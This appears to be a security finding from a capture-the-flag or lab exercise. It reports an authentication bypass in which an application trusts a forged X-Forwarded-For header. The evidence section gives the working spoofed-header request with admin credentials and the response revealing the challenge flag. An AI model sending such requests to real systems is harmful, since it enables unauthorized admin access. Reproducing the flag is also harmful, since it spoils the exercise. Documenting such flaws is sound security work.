findings.title: Authentication Bypass via X-Forwarded-For Header Spoofing
findings.description: The application enforces a network-based access control check using the X-Forwarded-For header instead of the actual remote IP address. By sending 'X-Forwarded-For: 127.0.0.1' (or any internal IP), an unauthenticated external attacker can completely bypass the login form and gain admin access. The application blindly trusts this client-controlled header as a source of the requestor's IP address, which is trivially forged.
findings.evidence:
POST /index.php HTTP/1.1 Host: 172.17.0.1:44553 X-Forwarded-For: 127.0.0.1 Content-Type: application/x-www-form-urlencoded username=admin&password=admin Response:

Welcome Admin

Congratulations, here is the flag: flag{0860966c-999f-4fbb-8072-0187ae47abec}
